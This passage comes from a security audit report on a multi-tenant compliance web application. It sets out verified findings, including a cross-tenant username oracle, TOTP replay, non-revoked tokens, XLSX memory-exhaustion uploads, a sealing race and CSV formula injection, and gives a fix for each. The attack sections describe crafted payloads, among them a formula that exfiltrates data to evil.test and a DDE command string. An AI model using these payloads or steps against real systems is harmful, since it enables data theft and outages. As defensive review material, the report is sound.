**Mechanism.** `User` inherits `AbstractUser`, whose `username` carries a plain installation-wide `unique=True`; unlike every other per-tenant name in the product it has no `UniqueConstraint(workspace, ...)` and no `CurrentWorkspaceDefault` hidden field. DRF builds the serializer's uniqueness check from `model_field.model._default_manager` (`field_mapping.py:80`), and for `accounts.User` that manager is `TenantUserManager` (`accounts/models.py:111`), whose `get_queryset()` calls `._pin()` (`tenancy.py:283-287`) and adds `WHERE workspace_id = <ActiveWorkspace()>`. So `UniqueValidator` looks only inside the caller's own workspace, sees nothing, and passes; `UserWriteSerializer.create`/`update` (`accounts/serializers.py:79-96`) then calls `user.save()` and the global `UNIQUE(accounts_user.username)` fires. There is no `ATOMIC_REQUESTS` and no exception handler for `IntegrityError` anywhere in the request path (`grep IntegrityError` finds it only in `accounts/saml.py:391` and `attestations/pbc_views.py:96`), so it escapes the view as a 500. Note the codebase already solved exactly this class of problem for per-workspace constraints — `tenancy.py:330-344` `CurrentWorkspaceDefault` exists so "a per-workspace unique constraint validates as 400 instead of failing as an IntegrityError" — `username` is the one globally-unique column on a tenant model that was left out.

**Attack.** Verified empirically against an in-memory test DB with two workspaces (Alpha=default, Beta). As Beta's administrator (`can_manage_users`, no superuser): `PATCH /api/users/<a-beta-user-id>/ {"username": "mia"}` where `mia` exists only in Alpha raises `IntegrityError: UNIQUE constraint failed: accounts_user.username` (production: HTTP 500). The same PATCH with `definitely-not-taken-anywhere` returns 200 and can be patched straight back, leaving no trace. `POST /api/users/` behaves identically. That is a clean two-state oracle over the whole installation's username space: 500 => this person has an account in another customer's organisation, 200/201 => they do not. Usernames here are person-derived (the shipped seeds are `ada`, `mia`, `owen`, `aria`, `val`; real installs use names or email localparts), so a Beta admin can confirm which named staff of a competitor are users of the platform, and enumerate at speed because authenticated traffic carries no throttle at all (`config/settings.py:387-400` registers only `AnonRateThrottle`).

**Guard checked.** Looked for (a) a `validate_username` or explicit `UniqueValidator` on `UserWriteSerializer` — `accounts/serializers.py:63-96` has neither and no `extra_kwargs`; (b) a check in `UserViewSet.perform_update`/`perform_create` — `accounts/views.py:83-110` guards only privilege/lockout, never uniqueness; (c) a per-workspace constraint on the model — `accounts/models.py:103-125` adds none, and `grep unique=True` over all `models.py` shows `username` is the only globally-unique column on a `TenantModel` other than the untenanted SSO/passkey/signing tables; (d) test coverage — `accounts/tests_tenancy.py:242-254` deliberately tests per-workspace uniqueness for `Framework.key` and `Role.name` and stops there, never touching `username`.

**Fix.** Add an installation-wide uniqueness check to the serializer so the collision is a 400 rather than a 500: on `UserWriteSerializer`, declare `username = serializers.CharField(validators=[UniqueValidator(queryset=User.objects.model._base_manager.all())])` (or add `def validate_username` that queries under `tenancy.unscoped()`), and return a generic message such as "That username is not available" that does not confirm where the conflict lives. Longer term, either scope usernames per workspace (`UniqueConstraint(workspace, username)` plus a custom `USERNAME_FIELD` lookup) or make usernames opaque so the oracle carries no information.

---

## [MEDIUM] Any tenant administrator reads every other organisation's webhook delivery log via GET /api/notifications/channels/

**Dimension:** tenant-read  
**Where:** backend/notifications/views.py:28-32; backend/notifications/models.py:26-45 (WebhookDelivery is a plain models.Model, not a TenantModel)

**Mechanism.** `ChannelsView.get` returns `body["deliveries"] = [... for d in WebhookDelivery.objects.all()[:10]]` to anyone with `is_superuser or can_manage_users` (`notifications/views.py:28-32`). `WebhookDelivery` (`notifications/models.py:26-45`) is one of the eleven models that never inherited `TenantModel` in the 0.9.0 workspace migration — it has no `workspace` column and a plain `Manager`, so `_pin()` never runs against it and `.objects.all()` is genuinely installation-wide. Rows are written from per-workspace code paths (`notifications/webhooks.py` called by `post_daily_summary` inside `for_each_workspace`, by `questionnaire.submit`, and by the package seal/issue/withdraw and quarantine events), so the table interleaves every tenant's activity.

**Attack.** Verified empirically: with a `WebhookDelivery(event="questionnaire.returned", channel="slack", ok=True, response_code=200, error="alpha-only detail")` row written while workspace Alpha was active, `GET /api/notifications/channels/` as Beta's administrator (non-superuser) returned `"deliveries":[{"event":"questionnaire.returned","channel":"slack","ok":true,"response_code":200,"error":"alpha-only detail","at":"..."}]`. A competitor's admin polling this endpoint gets a rolling view of another customer's compliance activity and its timing — when they sealed an audit package, when an auditor was issued a grant, when a vendor questionnaire came back, when a file was quarantined — plus whatever the chat provider put in `error`. No document names or identifiers appear, so this is activity metadata rather than evidence content.

**Guard checked.** Checked whether the read is scoped anywhere: `notifications/views.py:11-33` declares only `permission_classes = [IsAuthenticated]` and re-checks `can_manage_users` in-body at `:28`, with no workspace filter; there is no `get_queryset` and no `tenancy.scoped(...)` in the module. Confirmed `WebhookDelivery` is absent from the 35 models listed as `TenantModel` and that `notifications/migrations/` has no `_workspaces` migration, so no filter exists at the model layer either. The sibling `NotificationReceipt` is also untenanted but is safely keyed by `user` (`notifications/views.py:62-65`).

**Fix.** Either make `WebhookDelivery` a `TenantModel` (add the workspace column, stamp it in `notifications/webhooks.py` from `tenancy.current_id()`, and let the manager pin the read), or — since the Slack/Teams webhook itself is operator-configured and installation-wide — restrict the `deliveries` block at `notifications/views.py:28` to `request.user.is_superuser` only and drop `can_manage_users` from that branch.

---

## [MEDIUM] Changing a password (or resetting a user's MFA) revokes nothing: a stolen refresh token keeps working and renews itself indefinitely

**Dimension:** authn  
**Where:** backend/accounts/serializers.py:128-132; backend/accounts/views.py:112-131; backend/config/settings.py:408-419; .venv/Lib/site-packages/rest_framework_simplejwt/serializers.py:111-145

**Mechanism.** `PasswordChangeSerializer.save` (accounts/serializers.py:128-132) is `user.set_password(...); user.save(update_fields=["password"])` — nothing more. `UserViewSet.reset_mfa` (accounts/views.py:112-131) deletes the TOTP device, every passkey and every backup code, and again revokes no token. `grep -rn 'blacklist|OutstandingToken' backend/` shows the only revocation sites are `LogoutView` (accounts/views.py:182, which blacklists only a refresh token the *client* supplies in the body — impossible in cookie mode, since the SPA cannot read the HttpOnly cookie) and `SessionClearView` (accounts/session_views.py:72-80), both driven by the holder of the session, i.e. by the attacker's own browser, never by the victim's remediation. Meanwhile SimpleJWT's rotation (serializers.py:128-141, enabled at settings.py:415-416) does `refresh.set_jti(); refresh.set_exp(); refresh.set_iat()` — `set_exp()` restarts the 7-day clock from now — and its only user check is `USER_AUTHENTICATION_RULE`, i.e. `is_active`. The password hash is never consulted, so unlike a Django session (which dies on password change through `get_session_auth_hash`), a JWT session survives it.

**Attack.** An attacker exfiltrates a refresh token — trivial in `AUTH_TRANSPORT=header` mode where it sits in localStorage, and reachable in cookie mode from a shared or forensically-recovered browser profile. The user notices something wrong and changes their password; an administrator also runs `POST /api/users/{id}/reset_mfa/` and re-enrols them. Neither action touches the token. The attacker keeps calling `POST /api/auth/token/refresh/` every few days; each call returns a fresh access token *and* a fresh 7-day refresh token, so the session never expires. The only thing that ends it is deactivating the account (`is_active=False`, which `CHECK_USER_IS_ACTIVE` does catch at cookie_auth.py:161-162) — an action the incident playbook has no reason to take after a mere password reset.

**Guard checked.** I looked for a post-password-change revocation: a `post_save` signal on User, a `token_version`/`password_changed_at` claim compared in `CookieJWTAuthentication.get_user` (accounts/cookie_auth.py:146-165 checks only user existence, `is_active`, and workspace archival), or a call to `_blacklist_all` from the password path (`accounts/session_views.py:89-100` — it exists and is exactly the right helper, but is only called from `SessionClearView`). None. `accounts/tests.py:64` covers rotation-and-blacklist on refresh; there is no test that a password change invalidates an outstanding token.

**Fix.** Call `accounts.session_views._blacklist_all(user)` from `PasswordChangeSerializer.save`, from `UserWriteSerializer.update` when `password` is present, and from `UserViewSet.reset_mfa`. Because access tokens are stateless for up to 60 minutes, also add a monotonic `token_version` (or `password_changed_at`) to the user, stamp it into the token claims, and compare it in `CookieJWTAuthentication.get_user` so the change takes effect immediately rather than on the next refresh.

---

## [MEDIUM] A TOTP code is accepted repeatedly for up to 90 seconds — no used-code or counter store, so an intercepted code is replayable

**Dimension:** authn  
**Where:** backend/accounts/models.py:303-315; backend/accounts/mfa.py:54-68; backend/accounts/serializers.py:181; backend/accounts/oidc.py:525

**Mechanism.** `mfa.verify` (accounts/mfa.py:54-68) checks the submitted code against counters `c-1, c, c+1` (`window=1`, line 64) and returns a bare boolean. `MfaDevice.verify` (accounts/models.py:303-315) calls it and, on success, writes `last_used_at` — but `last_used_at` is only ever *written*; `grep -rn 'last_used_at' backend/` shows it is read nowhere in a verification path (only in `accounts/admin.py:16-18` and `passkeys.serialize`). There is no `last_counter` / consumed-code column on `MfaDevice` (accounts/models.py:283-315) and no cache marker. Consequently the same six digits satisfy `accounts/serializers.py:181` (password login) and `accounts/oidc.py:525` (SSO step-up) every time they are presented, from the start of window c-1 to the end of window c+1 — a 90-second reuse window, across every worker and every endpoint. RFC 6238 §5.2 explicitly requires the verifier to refuse a code it has already accepted. Note the contrast with the code's own care elsewhere: WebAuthn challenges are fetch-and-delete under `select_for_update` (accounts/passkeys.py:90-102), backup codes are marked `used_at` and filtered on it (accounts/models.py:205-209), and SAML assertion ids go into a shared replay table (accounts/saml.py:381-392). TOTP is the one factor with no replay store.

**Attack.** An attacker who already holds the password observes one code — an adversary-in-the-middle phishing page that proxies the real login, a screen-sharing or shoulder-surf capture, a malicious browser extension, or a support call where the user reads the code aloud. Within 90 seconds they replay `POST /api/auth/token/ {"username":..,"password":..,"otp":"<same code>"}` from their own machine and receive a full token pair — the victim's own successful login does not consume the code. The same replay works against the SSO step-up at `POST /api/auth/oidc/redeem/` (accounts/oidc.py:525). Combined with finding 1 the window is also the target of unmetered online guessing.

**Guard checked.** I looked for the guard on each layer: a consumed-counter column or unique constraint on `MfaDevice` (accounts/models.py:283-315 — absent), a cache-based single-use marker in `mfa.verify` (accounts/mfa.py:54-68 — absent), a check at the call sites (accounts/serializers.py:178-183 and accounts/oidc.py:520-527 — both call `device.verify(code)` and nothing else), and a test (`grep last_used_at` over the suite hits only tests_webauthn.py:251, for passkeys). SECURITY.md:186-188 claims MFA is "safe by construction" and that backup codes are single-use, but makes no single-use claim for TOTP.

**Fix.** Persist the last accepted counter on `MfaDevice` (e.g. `last_counter = PositiveBigIntegerField(null=True)`), have `mfa.verify` return the matching counter rather than a bool, and refuse any code whose counter is `<= last_counter` before recording the new value — writing it inside a `select_for_update` transaction so two concurrent submissions cannot both win. Consider narrowing `window` to 1 only for the ±1 drift you actually need.

---

## [MEDIUM] SSO auto-provisioning probes username uniqueness workspace-scoped against a globally-unique column, so provisioning dies with an unhandled IntegrityError

**Dimension:** sso  
**Where:** backend/accounts/oidc.py:463 (primary); backend/accounts/oidc.py:387-395, 455; backend/accounts/tenancy.py:283-287; backend/accounts/models.py:103, 111

**Mechanism.** `_unique_username(email)` is evaluated at oidc.py:463, i.e. *inside* `with tenancy.scoped(workspace):` (opened at oidc.py:455). Its probe is `while User.objects.filter(username__iexact=candidate).exists()` (oidc.py:392), and `User.objects` is a `TenantUserManager` whose `get_queryset()` calls `._pin()` (tenancy.py:283-287), so with the SSO workspace active the query becomes `... AND workspace_id = <sso workspace>`. But `User` inherits `AbstractUser` (models.py:103) and never overrides `username`, so the DB constraint is `UNIQUE(username)` across the whole installation -- and `User.workspace` is explicitly nullable (models.py:106-109), so workspace-less accounts are invisible to the probe as well. `.exists()` therefore returns False for a username that is in fact taken, the `-2` disambiguation loop never runs, and `User.objects.create_user(username=...)` at oidc.py:462-465 hits the global unique index. This is the exact mirror-image of finding 1: the query that must be scoped is not, and the query that must not be scoped is.

**Attack.** OIDC_AUTO_PROVISION=1, SSO_WORKSPACE=alpha. A user-manager in workspace `beta` (or any operator, or a `createsuperuser` account with `workspace_id = NULL`) holds the username `jane@corp.example` -- either coincidentally, because the same person exists in both tenants, or deliberately, by POSTing /api/users/ with `username: "jane@corp.example"` to pre-empt it. Jane then signs in through the IdP for the first time. `_unique_username` returns `jane@corp.example` unchanged because the pinned probe sees no such row in alpha, `create_user` raises `django.db.utils.IntegrityError`, which is not an `OidcError`, so neither `oidc_views._fail` (oidc_views.py:123-124) nor `SamlAcsView` (saml_views.py:52-53) catches it: the callback returns HTTP 500 with a traceback (settings.py:33 leaves DEBUG defaulting to True), `oidc.audit()` is never reached so nothing is written to the audit trail, and Jane can never be provisioned. A tenant that should be invisible to workspace alpha can thus deny SSO onboarding there, one username at a time.

**Guard checked.** There is no try/except around `create_user` in `resolve_user`; the only handler is `except oidc.OidcError` in the two views. `@transaction.atomic` on `resolve_user` (oidc.py:398) rolls the row back but does not convert the exception. `tests_oidc.py` and `tests_saml.py` provision only into the single active test workspace (`test_names_come_from_attributes_and_provisioning_works`, tests_saml.py:211-218), so the collision case is untested; `accounts/tests_tenancy.py` never provisions over SSO.

**Fix.** Compute the username outside the tenant scope -- either hoist `given, family = _names(claims)` and `username = _unique_username(email)` above the `with tenancy.scoped(workspace):` block at oidc.py:455, or call it as `with tenancy.unscoped(): username = _unique_username(email)`; and wrap `create_user` in `except IntegrityError: raise OidcError("denied", ...)` so a residual race is a clean refusal with an audit row instead of a 500.

---

## [MEDIUM] XLSX importer's zip-bomb guard trusts the archive's declared sizes, then decompresses unbounded — 300 KB of upload allocates 600 MB, provably

**Dimension:** files-in  
**Where:** backend/governance/risk_import.py:142-168 (guard at :147, unbounded reads at :162 and :166); reached from backend/governance/views.py:322-336 and backend/vendors/views.py:190-220; contrast backend/documents/preview.py:103-118

**Mechanism.** `_read_xlsx` guards on the central directory's self-declared uncompressed sizes and then reads whole members with no ceiling:

```python
if sum(i.file_size for i in zf.infolist()) > MAX_UNZIPPED_BYTES:
    raise ValueError("Spreadsheet is too large to import.")
...
root = ET.fromstring(zf.read("xl/sharedStrings.xml"))
...
root = ET.fromstring(zf.read(sheet_names[0]))
```

`ZipInfo.file_size` is attacker-controlled metadata. `ZipFile.read(name)` calls `ZipExtFile.read()` with no argument, which invokes `_read1(self.MAX_N)` — `MAX_N` is 2**31-1 — so `zlib.decompressobj().decompress(data, MAX_N)` materialises the *entire* decompressed stream in one allocation before CPython truncates the returned buffer to the declared `file_size`. The identical parser in documents/preview.py:103-118 does it correctly and says why: it uses `zf.open(member)` with `fh.read(MAX_PART_BYTES + 1)` and comments "bytes are read in chunks up to a ceiling the zip header cannot talk us past". risk_import.py, which is what both import endpoints actually use (vendors/matrix.py:32 imports `parse_upload` from it), does not.

I proved it with the project venv (Python 3.13): a 305,900-byte zip whose central directory declares `file_size=64` (CRC patched to the 64-byte prefix so nothing raises) passes the guard — `sum(file_size) = 64` against a 20 MB limit — and `zf.read("xl/sharedStrings.xml")` returns 64 bytes with no exception while `tracemalloc` records a 630,902,769-byte (602 MB) peak inside that single call.

**Attack.** A user with `can_manage_frameworks` posts the crafted file to `POST /api/risks/import/` (governance/views.py:322-336; the only size check is `upload.size > 2 MB`, risk_import.py:192) or to `POST /api/vendors/{id}/matrix/parse/` (vendors/views.py:190-220). At the 2 MB cap and deflate's ~1032:1 ratio the archive can carry two such members (sharedStrings and sheet1, both read at :162 and :166), so one request drives roughly 2–4 GB of transient allocation. Authenticated traffic is globally unthrottled (settings.py:387-388 registers only `AnonRateThrottle`, and neither action sets a scope), so a handful of concurrent requests OOM-kills the gunicorn workers and takes the whole installation — every workspace — offline. A variant that leaves the CRC unpatched additionally escapes as an uncaught `zipfile.BadZipFile` (only `ValueError` is caught at governance/views.py:334 and vendors/views.py:218, and `BadZipFile` is only caught at construction, risk_import.py:145) and returns a 500.

**Guard checked.** I verified the request-level caps do exist and are enforced twice (governance/views.py:330 and risk_import.py:192, vendors/views.py:209) — they bound the *compressed* input only. I verified `MAX_ROWS`/`MAX_TEXT` are applied after parsing, too late. I verified `ET.fromstring` on stdlib ElementTree does not resolve entities, so the XXE/billion-laughs angle is genuinely closed. The one guard aimed at this attack, `sum(i.file_size)` at :147, is the one that reads attacker-supplied metadata; the sibling implementation in preview.py shows the correct pattern already exists in the codebase.

**Fix.** Replace both `zf.read(...)` calls with the bounded read preview.py already uses: `with zf.open(member) as fh: raw = fh.read(LIMIT + 1)` and reject when `len(raw) > LIMIT` — `ZipExtFile.read(n)` passes `n` as `max_length` to the decompressor, so no allocation exceeds the ceiling. Keep the `sum(file_size)` check as a cheap early-out, but stop treating it as the bound. Also catch `zipfile.BadZipFile` around the reads and re-raise as `ValueError` so a corrupt archive is a 400, matching the module's stated contract at risk_import.py:156-158.

---

## [MEDIUM] In-app signature verification trusts the public key stored in the same database row, so a database-write attacker can re-sign a rewritten manifest and every screen shows a green "Signed"

**Dimension:** crypto  
**Where:** backend/attestations/signing.py:201-207 (signature_status); backend/attestations/views.py:265-282 (signature action), 310-325 (verify action); frontend/src/pages/Packages.jsx:394-400

**Mechanism.** `signature_status(package)` calls `verify_bytes((package.manifest_json or "").encode("utf-8"), package.manifest_signature, package.signing_public_key)` (signing.py:205-206) — message, signature and *verification key* all read from the same row. Nothing compares `package.signing_key_id` with the installation's live key (`signing.current_key_info()`) or with the `SigningKey` table. The `signature` action returns `"status": signing.signature_status(package)` and echoes the row's own `fingerprint` (views.py:280-281); `verify` returns `"ok": not drifted and sig != "invalid"` (views.py:319-322). The UI renders `<Badge tone={integrity?.signature === "invalid" ? "danger" : "success"}>Signed</Badge>` with `selected.signing_key_id` (Packages.jsx:394-400). This directly undercuts the design claim in signing.py:12-14 and SECURITY.md:246-249 that a dump or a SQL injection "yields the evidence and every digest, but not the key" — forgery needs no key at all, only the ability to write three columns.

**Attack.** An attacker with write access to the application database (SQL injection, a stolen backup restored into a staging instance the customer then trusts, a rogue DBA, or the Django admin — `SessionAuthentication` is globally enabled and 27 models are registered) generates their own Ed25519 key, rewrites `manifest_json` to remove an exception, and sets `manifest_signature`, `signing_key_id`, `signing_public_key` to their own values on that package. `GET /api/evidence-packages/{id}/verify/` returns `{"ok": true, "signature": "valid"}`; `/signature/` returns `"status": "valid"` with the attacker's fingerprint; the package screen shows a green "Signed" badge. Export produces a bundle that verify.py also calls VALID, because signing-key.pub is written from the same tampered column (bundle.py:487-488). Only a human who separately fetches Settings › About and compares 16 hex characters catches it, and the product never prompts that comparison for anyone but the external auditor.

**Guard checked.** `SigningKeysView` (views.py:370-386) does publish the authoritative list, and `register_key` (signing.py:171-182) does record every key that has signed — so the data needed for the check exists. Neither `signature_status`, `verify`, `signature` nor `Packages.jsx` consults it. `tests_signing.py:95-106` tests only that mutating `manifest_json` alone flips the status to "invalid", which is the case where the attacker forgot to re-sign.

**Fix.** In `signature_status`, after `verify_bytes` succeeds, compare `package.signing_key_id` against the installation's keys — `signing.current_key_info(create=False)["key_id"]` plus the `SigningKey` rows — and return a third status such as `"foreign_key"` when it matches none. Surface that as a red badge ("signed by a key this installation does not hold") in `/verify`, `/signature` and Packages.jsx, and drop `ok` to false for it.

---

## [MEDIUM] Unbounded XLSX column index in the stdlib importer turns a ~300-byte upload into a multi-gigabyte allocation (worker OOM)

**Dimension:** injection-ssrf  
**Where:** backend/governance/risk_import.py:115-121 (_col_index), backend/governance/risk_import.py:169-185 (_read_xlsx row build); reachable from backend/governance/views.py:322-333 (POST /api/risks/import/) and backend/vendors/views.py:190-217 (POST /api/vendors/{id}/matrix/parse/ -> vendors/matrix.py:255 recognise -> parse_upload)

**Mechanism.** `_read_xlsx` derives each cell's column position from the attacker-supplied `r` attribute of `<c>`: `idx = _col_index(ref)` (risk_import.py:175). `_col_index` (risk_import.py:115-121) is a plain base-26 accumulator — `for ch in letters: idx = idx * 26 + (ord(ch) - 64)` — with no ceiling on the number of letters and no clamp on the result. The row is then materialised densely: `width = max(cells) + 1` and `rows.append([cells.get(i, "") for i in range(width)])` (risk_import.py:179-180). A single cell reference of seven letters yields width 8,353,082,581; ten letters yields 146,813,779,479,509. The list comprehension allocates one pointer per column. This is the *only* xlsx reader in the tree that omits a column clamp — the sibling reader in `backend/documents/preview.py:289-294` does exactly the same work but guards it: `idx = _col_index(c.get("r", "A1")); if idx >= MAX_SHEET_COLS: continue` (MAX_SHEET_COLS = 64, preview.py:30). The guard was written and then not carried across.

**Attack.** Any account holding `can_manage_frameworks` (RiskPermission, governance/views.py:247-248) POSTs a 290-byte .xlsx to `/api/risks/import/` whose sheet1.xml is `<row r="1"><c r="A1" t="inlineStr"><is><t>title</t></is></c><c r="ZZZZZZZ1" t="inlineStr"><is><t>x</t></is></c></row>`. I built and ran exactly this against the venv interpreter with a 4-letter reference: a 290-byte upload produced a 475,254-element row in 1.2 s. Scaling the reference to `ZZZZZZZ1` (verified `_col_index` return: 8,353,082,581) asks CPython for a ~67 GB list — the gunicorn worker spins, then dies on MemoryError or is OOM-killed by the container. Nothing throttles it: `DEFAULT_THROTTLE_CLASSES` is `[AnonRateThrottle]` only (config/settings.py:387), so authenticated traffic is globally unthrottled and the request can be repeated until every worker is gone. The identical payload also lands via `/api/vendors/{id}/matrix/parse/`.

**Guard checked.** I looked for every bound that could stop it. (1) `upload.size > MAX_FILE_BYTES` (governance/views.py:330, vendors/views.py:209) caps the *compressed* upload at 2 MB — the payload is 290 bytes. (2) `sum(i.file_size for i in zf.infolist()) > MAX_UNZIPPED_BYTES` (risk_import.py:147) is a zip-bomb guard on decompressed bytes — the sheet XML is a few hundred bytes; the blowup is in Python's list, not in the zip. (3) `if len(rows) > MAX_ROWS + 1: break` (risk_import.py:183) bounds *rows*, and it runs only after the offending row has already been built. (4) `except ValueError` in both views converts parse errors to 400, but MemoryError is not a ValueError and, more importantly, the damage happens before any exception. (5) libexpat 2.8.1 amplification protection (confirmed: a billion-laughs payload raises ParseError) does not apply — the XML is small and well-formed. (6) No MAX_COLS constant exists anywhere in risk_import.py or vendors/matrix.py. No test in the tree exercises a large cell reference.

**Fix.** Clamp the column index the same way the preview reader does. In `_read_xlsx` (risk_import.py:175-177), add a `MAX_COLS` module constant (e.g. 256, comfortably above any real register) and skip out-of-range cells: `idx = _col_index(ref) if ref else fallback` followed by `if idx >= MAX_COLS: continue` before `cells[idx] = ...`. Optionally also cap the accumulator inside `_col_index` (stop after 3 letters, XFD being Excel's real maximum).

---

## [MEDIUM] Vendor-supplied column headings are written into the responsibility-matrix CSV export without csv_safe, reopening formula injection in the one export sent back to a third party

**Dimension:** injection-ssrf  
**Where:** backend/vendors/views.py:239 (writer.writerow(header)); source chain: backend/vendors/matrix.py:201 (report entry keeps the raw name), backend/vendors/matrix.py:342-359 (clean_layout), backend/vendors/matrix.py:377-378 (render_layout), backend/frontend/src/pages/Vendors.jsx:730 (round-trip)

**Mechanism.** `matrix_export` writes two kinds of row. Every data row is sanitised — `writer.writerow(csv_safe(line))` at vendors/views.py:241 and `writer.writerow(csv_safe([...]))` at :248 — but the vendor-layout header row is not: line 238 does `header, lines = matrix_lib.render_layout(vendor.matrix_layout, rows)` and line 239 does a bare `writer.writerow(header)`. `render_layout` builds that header as `header = [c["name"] for c in columns]` (matrix.py:378), and those names are stored verbatim: `clean_layout` only truncates — `name = str(col.get("column") or col.get("name") or "").strip()[:120]` (matrix.py:351) — with no leading-character check. The names originate outside the organisation: `recognise_headers` copies the uploaded file's header cells unchanged into its report, `report.append({"column": name, ...})` (matrix.py:201), and the SPA posts that report straight back as the saved layout: `layout: review.columns.map((c) => ({ name: c.column, role: c.role, index: c.index }))` (frontend/src/pages/Vendors.jsx:730). csv.writer quotes commas and quotes but does nothing about a leading `=`, `+`, `-` or `@`.

**Attack.** A vendor sends the organisation its own responsibility matrix as .xlsx/.csv with a column heading of `=HYPERLINK("https://evil.test/?d="&A2,"Provider")` (or `=WEBSERVICE(...)`, or the DDE form `=cmd|'/c calc'!A0`). Staff run the documented workflow: POST /api/vendors/{id}/matrix/parse/, review the recognised columns, then PUT /api/vendors/{id}/matrix/ with `source="import"` — the heading is now stored in `vendor.matrix_layout`. Later anyone with read access (CanManageFrameworks is read-open to every authenticated account, accounts/permissions.py:9-14) fetches GET /api/vendors/{id}/matrix/export/?layout=vendor. The purpose of that endpoint, per its own docstring at vendors/views.py:224-226, is that the file "can go back to them looking like their own document" — so the poisoned CSV is opened in Excel by staff and mailed onward to the vendor. Row 1 executes.

**Guard checked.** I checked whether `csv_safe` was applied anywhere on this path: `config/csvsafe.py:10-16` prefixes a leading `= + - @ \t \r` with an apostrophe, and every other CSV generator in the product routes its rows through it (compliance/views.py:110, compliance/responsibility_views.py:173, governance/views.py:142 and :307, attestations/pbc_views.py:248, attestations/bundle.py:176, vendors/views.py:241 and :248). Line 239 is the single writerow in the tree that skips it. I also checked `clean_layout` (matrix.py:342-366) for a character allowlist — it validates only `role` against ROLES and truncates `name` to 120 chars — and `recognise_headers` (matrix.py:172-201) for normalisation of the stored name: `_norm(name)` is used for scoring only; the raw `name` is what is reported and stored. The `slug` built at vendors/views.py:232 is `isalnum()`-filtered but that only guards the filename, not the body.

**Fix.** One line: change `writer.writerow(header)` at vendors/views.py:239 to `writer.writerow(csv_safe(header))`. Belt-and-braces, also reject or prefix a dangerous leading character in `clean_layout` (matrix.py:351) so the hostile string is never persisted in `vendor.matrix_layout` in the first place.

---

## [MEDIUM] The switched-workspace choice survives a change of user in the same browser: login() never clears it

**Dimension:** frontend  
**Where:** frontend/src/api/client.js:154-165 (login), :62-74 (redeemSso), :167-171 (clearSession), :93-102

**Mechanism.** `clearSession()` (`client.js:167-171`) is the only function that calls `chooseWorkspace("")` and so the only thing that removes `localStorage.workspace`. It runs from `logout()` (`:192`) and from the 401 interceptor after a failed refresh (`:147`). `login()` (`:154-165`) writes the new `access`/`refresh` tokens (or, in cookie mode, just lets the server set cookies) and returns — it never calls `clearSession()`. `redeemSso()` (`:62-74`) is the same. Because `/login` is a top-level route rendered outside `Protected` (`App.jsx:154`), reaching it does not require any 401 to have fired. So a `workspace` value written by one person's session is inherited verbatim by the next person to sign in on that browser, and `client.js:100-102` starts stamping it on their requests immediately.

**Attack.** Shared or handed-over workstation. Superuser Alice switches to workspace `beta` (`localStorage: workspace=beta`) and walks away without signing out — she closes the tab, or just types `/login` in the address bar. Superuser Bob, homed in `acme`, opens the browser, goes to `/login`, and signs in. His tokens replace Alice's; `workspace=beta` is untouched. Every request Bob makes now carries `X-Workspace: beta` and `tenancy.workspace_id_for` (`tenancy.py:159-167`) honours it because he is a superuser. Bob believes he is in `acme` — the sidebar confirms it, per the previous finding — and reads, exports and writes `beta`'s compliance programme for the rest of the session. Same effect for a single admin returning after their access token expired, if they navigate straight to `/login` rather than letting a request 401.

**Guard checked.** I traced every writer and reader of the key. `chooseWorkspace` is called in exactly two places: `client.js:170` (inside `clearSession`) and `Account.jsx:1017` (the deliberate switch). No route guard, no `beforeunload`, and no session-scoped storage: `chosenWorkspace()` reads `localStorage`, not `sessionStorage`, so it also survives a browser restart. The server-side guard (superuser-only header) does not help here, because the population that can switch is exactly the population at risk.

**Fix.** Call `clearSession()` as the first statement of `login()` (`client.js:155`) and of `redeemSso()` (`:63`), before the credential request goes out. A sign-in is by definition the start of a new principal's session; nothing from the previous one should carry over. Optionally also move the key to `sessionStorage` so it cannot outlive the browser session.

---

## [MEDIUM] Sealing is a check-then-act with no row lock: evidence pinned concurrently lands inside a sealed package but outside its manifest and outside the exported bundle

**Dimension:** integrity-races  
**Where:** backend/attestations/views.py:204-205 and 227 (seal); backend/attestations/views.py:603-616 (PackageEvidenceViewSet.perform_create); backend/attestations/views.py:151-197 (add_controls); backend/attestations/bundle.py:430

**Mechanism.** `seal` loads the package at `views.py:204` with a plain `get_object()` — no `select_for_update` — checks `assert_open(package)` at `:205`, then does several seconds of work (`verify_pins` at `:218` re-hashes every pinned file from disk) before it opens `transaction.atomic()` at `:227`. Inside that block nothing re-reads or re-checks `status`. Meanwhile `PackageEvidenceViewSet.perform_create` performs the mirror-image check — `assert_open(row.package)` at `:608` on its own separately-loaded instance — and then calls `pin_document` at `:612`. There is no lock, no version column and no status re-check on either side, so the two interleave freely. `select_for_update` is used elsewhere in this codebase where it matters (accounts/passkeys.py:93-94, vendors/questionnaire.py:236-238), so its absence here is an omission rather than a house style.

**Attack.** Assembler A posts `POST /api/package-evidence/` (or `/add_controls/`) while assembler B posts `/seal/` on the same package. B's `assert_open` passes, B spends the re-hash window in `verify_pins`, A's `assert_open` passes against the still-DRAFT row, and A's `pin_document` commits after B's seal. Result: a `PackageEvidence` row belonging to a SEALED package that `bundle.assign_paths` (bundle.py:150-165) never reached, so it has `member_path == ""` and `ordinal == 0`. It is absent from `manifest.json`; `bundle.write_bundle` skips its bytes entirely (`if not row.member_path: continue`, bundle.py:430); but it IS returned by the API, IS counted by `EvidencePackage.evidence_count` (models.py:124-126) and `EvidencePackageSerializer.get_evidence_count`, and IS listed in `evidence.csv` with an empty path. `verify_pins` re-hashes it successfully, so `GET /verify/` still answers `ok=True`. The seal audit entry's `evidence_count` (views.py:250) no longer matches the package. The same window lets two `/seal/` calls both proceed, each running `assign_paths`, `build_manifest` and `signing.sign_package`, with the second overwriting the first's `manifest_json`/`manifest_sha256`/`sealed_at` while the first digest is already immortalised in the audit trail at views.py:249-256.

**Guard checked.** `assert_open` (views.py:60-65) is the only status gate and is evaluated outside any lock or transaction on both sides. `EvidencePackage` carries no optimistic-concurrency column (models.py:22-126). The `transaction.atomic()` at `:227` protects the manifest write against a crash, not against a concurrent writer, because the package row is never locked and `status` is never re-read inside it. Nothing in attestations/tests.py exercises concurrent access. The one place the codebase does defend a comparable invariant with a database constraint — `PbcRequest` ordinal allocation, retried against `unique_together ("package", "ordinal")` at pbc_views.py:83-97 / models.py:475-477 — shows the team knows the pattern.

**Fix.** Take the lock at the top of every state-changing package action: `package = EvidencePackage.objects.select_for_update().get(pk=self.get_object().pk)` inside a `transaction.atomic()` that spans the whole of `seal`, `withdraw`, `add_controls`, and the `assert_open` + write in `PackageEvidenceViewSet`/`PackageControlViewSet`/`PackageSampleViewSet` — with `assert_open` re-evaluated after the lock is held.

---

## [MEDIUM] Quarantine and release events written by the `scan_evidence` sweep land with workspace = NULL and are invisible to every tenant's audit trail

